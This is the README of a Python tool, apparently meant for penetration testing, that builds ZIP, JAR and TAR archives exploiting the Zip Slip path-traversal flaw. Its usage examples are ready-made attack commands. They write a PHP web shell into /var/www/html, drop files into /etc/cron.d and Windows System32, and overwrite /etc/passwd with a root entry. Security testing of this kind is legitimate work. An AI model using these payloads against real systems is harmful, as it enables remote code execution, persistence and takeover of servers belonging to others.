# s31zipslip - Zip Slip Vulnerability Archive Creator

A powerful tool for creating archives with Zip Slip vulnerability for authorized security testing and penetration testing purposes. Now with Windows support!

## About

s31zipslip is a Python utility designed to create archive files (ZIP, JAR, TAR, etc.) containing specially crafted paths that demonstrate the Zip Slip vulnerability (CVE-2018-1002200). This tool helps security professionals test their applications against directory traversal attacks through archive extraction.

## Features

- Support for multiple archive formats: ZIP, JAR, TAR, TAR.GZ, TAR.BZ2
- **Windows and Linux path traversal support**
- Customizable target paths and filenames
- Flexible file content specification
- Clean and intuitive command-line interface
- Comprehensive error handling

## Usage

### Basic Syntax
```bash
python3 s31zipslip.py -d TARGET_DIRECTORY -f FILENAME -o OUTPUT_FILE [-c CONTENT]
```

### Options
| Flag | Description | Example |
|------|-------------|---------|
| `-d, --directory` | Target directory path for Zip Slip | `../../../../../../../tmp/` (Linux) or `..\..\..\Windows\Temp\` (Windows) |
| `-f, --filename` | Filename to create inside the archive | `test.txt` |
| `-o, --output` | Output archive filename | `exploit.zip` |
| `-c, --content` | File content (optional) | `"Malicious content"` |

### Examples

**Linux path traversal:**
```bash
python3 s31zipslip.py -d '../../../../../../../tmp/a/' -f test.txt -o test.zip
```

**Windows path traversal:**
```bash
python3 s31zipslip.py -d '..\..\..\..\..\..\Windows\Temp\' -f test.txt -o test.zip
```

**Create a TAR.GZ archive targeting cron directory (Linux):**
```bash
python3 s31zipslip.py -d '../../../../../../../etc/cron.d/' -f malicious.cron -o payload.tar.gz
```

**Create a JAR archive targeting Windows System32:**
```bash
python3 s31zipslip.py -d '..\..\..\..\..\..\Windows\System32\' -f malicious.dll -o exploit.jar
```

**Create a JAR archive with PHP shell content (Linux):**
```bash
python3 s31zipslip.py -d '../../../../../../../var/www/html/' -f shell.php -o exploit.jar -c '<?php system($_GET["cmd"]); ?>'
```

**Create a TAR archive with custom content:**
```bash
python3 s31zipslip.py -d '../../../../../../../etc/passwd' -f shadow -o backup.tar -c 'root:x:0:0:root:/root:/bin/bash'
```

## Supported Archive Formats

- **ZIP** (.zip)
- **JAR** (.jar)
- **TAR** (.tar)
- **TAR.GZ** (.tar.gz, .tgz)
- **TAR.BZ2** (.tar.bz2)

## How It Works

The tool creates archives containing files with malicious paths that include directory traversal sequences (`../` for Linux or `..\` for Windows). When vulnerable applications extract these archives without proper path sanitization, the files can be written to unexpected locations outside the intended extraction directory. The tool automatically detects the target platform based on the path separators used.